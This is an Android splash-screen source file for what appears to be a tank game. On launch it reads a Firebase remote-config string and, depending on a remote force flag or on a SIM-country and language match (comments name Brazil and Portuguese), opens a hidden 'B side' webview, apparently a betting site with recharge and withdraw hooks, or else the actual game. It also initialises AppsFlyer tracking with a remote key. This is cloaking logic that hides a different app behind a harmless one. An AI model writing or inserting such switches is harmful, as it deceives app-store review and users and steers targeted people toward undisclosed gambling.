package com.asdhjasd.asdasjdapikj;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.ThirtyNineEighty.Game.TanksActivity;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Locale;
import java.util.Map;

public class TankSplashActivity extends AppCompatActivity {

    private final String TAG = "asdasjdapikj";
    public static String[] datasObj;
    Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splashtank);
        context = this;
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600 * 24 * 40)//2次成功拉取配置时间间隔：50天
                //.setMinimumFetchIntervalInSeconds(0)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        try {
                            //https://www.leah.bet/?id=41736066|nRhcAXDYSrtBTzd94nRf8Z|jsBridge|openWindow|firstrecharge|recharge|amount|currency|withdrawOrderSuccess|true|cn|zh
                            String firebaseKey = BuildConfig.APPLICATION_ID.replace(".", "");
                            //key=包名去掉.
                            //APPLICATION_ID = "com.dashunbao.debugtest";
                            Log.d(TAG, "firebaseKey: " + firebaseKey);
                            String datas = mFirebaseRemoteConfig.getString(firebaseKey);
                            Log.d(TAG, "datas: " + datas);
                            if (!TextUtils.isEmpty(datas)) {
                                datasObj = datas.split("@@@");
                                Log.d(TAG, "datasObj=" + datasObj);

                                initAppsFlyer(datasObj[1]);
                                if (Boolean.parseBoolean(datasObj[9])) {
                                    //备用开关，强制打开B面
                                    startActivity(new Intent(context, TankWebMain.class));
                                    finish();
                                    return;
                                }
                                //归因+巴西国家码+葡萄牙语
                                final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                                //手机壳iso
                                final String simCountry = tm.getSimCountryIso();
                                // 创建Locale对象
                                Locale currentLocale = Locale.getDefault();
                                // 获取当前手机设置的语言=葡萄牙语：pt
                                // br=巴西
                                String currentLanguage = currentLocale.getLanguage();
                                Log.d(TAG, "simCountry=" + simCountry);
                                Log.d(TAG, "currentLanguage=" + currentLanguage);
                                if (datasObj[10].contains(simCountry)
                                        && datasObj[11].contains(currentLanguage)
                                ) {
                                    startActivity(new Intent(context, TankWebMain.class));
                                    finish();
                                } else {
                                    startActivity(new Intent(context, TanksActivity.class));
                                    finish();
                                }
                            } else {
                                startActivity(new Intent(context, TanksActivity.class));
                                finish();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.d(TAG, "e:" + e.getMessage());
                        }
                    }
                });

    }

    /**
     * 初始化AppsFlyer
     */
    /// private static boolean not_organic = false;
    private void initAppsFlyer(String afKey) {
        Log.d(TAG, "initAppsFlyer afKey=" + afKey);
        AppsFlyerLib.getInstance().setMinTimeBetweenSessions(0);
        AppsFlyerLib.getInstance().setDebugLog(true);

        // app flay初始化
        AppsFlyerLib.getInstance().init(afKey, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                //map={install_time=2023-09-25 13:27:12.578, af_status=Organic, af_message=organic install, is_first_launch=true}
                Log.d(TAG, "onConversionDataSuccess map=" + map);
            }

            @Override
            public void onConversionDataFail(String s) {
                Log.d(TAG, "onConversionDataFail=" + s);

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {
                Log.d(TAG, "onAppOpenAttribution=" + map);

            }

            @Override
            public void onAttributionFailure(String s) {
                Log.d(TAG, "onAttributionFailure=" + s);

            }
        }, getApplicationContext());


        AppsFlyerLib.getInstance().start(getApplicationContext(), afKey, new AppsFlyerRequestListener() {
            @Override
            public void onSuccess() {
                Log.d(TAG, "Launch sent successfully, got 200 response code from server");
            }

            @Override
            public void onError(int i, @NonNull String s) {
                Log.d(TAG, "Launch failed to be sent:\n" + "Error code: " + i + "\n" + "Error description: " + s);
            }
        });
    }
}